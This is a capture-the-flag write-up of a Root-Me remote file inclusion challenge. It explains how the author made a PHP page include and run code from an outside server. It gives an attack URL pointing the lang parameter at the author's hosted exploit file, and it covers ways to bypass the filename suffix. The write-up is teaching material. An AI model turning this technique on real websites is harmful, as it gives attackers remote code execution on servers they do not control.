Title: Remote File Inclusion

Information Gathering
Now we will get any information regarding the challenge. The goal is to read the PHP source code for this page.

We notice that the content dynamically changes changing the languages. I try to look deeper. I try to put a random string.

We get other information. The includes part must be like:
```
$lang = $_GET["lang"]; //en
include($lang."_lang.php"); //include en_lang.php
```

Because of that, we know that the developer does not set its absolute path which is vulnerable to RFI.

For now, I think this is enough to go into the strategy part.

Strategy
We know that this is vulnerable to RFI. Because our target is not in the internal network but in the public instead, we need a webserver that can be publicly accessible in order to exploit the vulnerability. The idea is to make our targets server include our malicious code from our web server. That is why we need a publicly accessible web server in order to exploit the vulnerability.

In this case, I will be using free hosting provided by the WebHost.

So the idea is, we will put a full path to my site on the lang URL parameter. for example:
```
http://challenge01.root-me.org/web-serveur/ch13/?lang=https://kopikulogojek.000webhostapp.com/myexploit.php
```

where `https://kopikulogojek.000webhostapp.com/` is the URL of my web server and the myexploit.php is the payload.

Now talking about the payload, our goal is to get the PHP source code. This can be done in at least 2 ways:

1. We use the system function in PHP to execute shell commands like cat index.php to show the content of the index.php.
2. We can also use the PHP built-in function like the highlight_file function or the show_source function.

Another thing to be considered, we know that the include function has a trailing string, the _lang.php. This also must be bypassed otherwise we can not load the correct file. There are 2 ways that I know to bypass it:

1. Make the exploit file has a trailing _lang.php string, for example, myexploit_lang.php. So when you call the file, you can call them like this, http://challenge01.root-me.org/web-serveur/ch13/?lang=https://kopikulogojek.000webhostapp.com/myexploit. So when this link is used, it will be like, include(https://kopikulogojek.000webhostapp.com/myexploit_lang.php);
2. We use null byte injection, hence we can control the file we want to include. The request will be like https://kopikulogojek.000webhostapp.com/myexploit.php%00. But, unfortunately, this PHP version is already later than PHP 5.3, hence the null byte injection vulnerability has been patched.

So that is our strategy blueprint, now we will execute them.

The Execution
Keep in mind, all documentation that I wrote here is the result of many and many trials and errors. So please do not consider yourself dumb or something just because you can not guess it in the first place. I did all the trials and errors for about 4 hours. 90% of my time was used to understand the concept of RFI, so its okay.

The Malicious Code
Since this is the core of the attack, we will focus on this one first. Back to the strategy, we will create a file called myexploit_lang.php. Because we are forced to use the .php extension, we face a problem. The problem is, every time this file is requested/called, all the PHP code will be executed on our server first. What we intend is we can pass the malicious code to our targets server and have them executed there, not here (here means in our server).

So the idea to overcome the problem is, instead of writing the malicious PHP code as the executable, I write our exploit code in a string and echo the string so the string that contains PHP code will be sent back to the targets server and will be executed on the targets server.

Using this way, we will know what is the server name that executes this code.

By this proof, we know that we have exploited the RFI vulnerability, why? Because we can force our targets server to execute a code from an external place, which in this case our server. This means that I can actually control what code a server can execute.

If you still do not get why this is dangerous, imagine this. When you build a website, all the necessary files must be put in the server right? The server itself is protected by a password (like if you are using Cpanel). Now imagine, I can force your website to execute code that is not controlled by you because it does not sit in your server but in mine instead. So basically, your website is executing code that is prepared by somebody else that you do not know.

Now lets finish the challenge. We just replace the PHP command as we have planned before to force the challenge to show its source code. Below is the result and of course, the flag.

Closing
Congratulations! you have tried to exploit RFI, and I really hope it encourages you to learn more. I think this is really interesting especially when you finally understand how RFI exploitation works. I wrote a deep explanation of RFI and LFI in this post. Using this post, you will understand deeper about RFI and LFI exploitation.
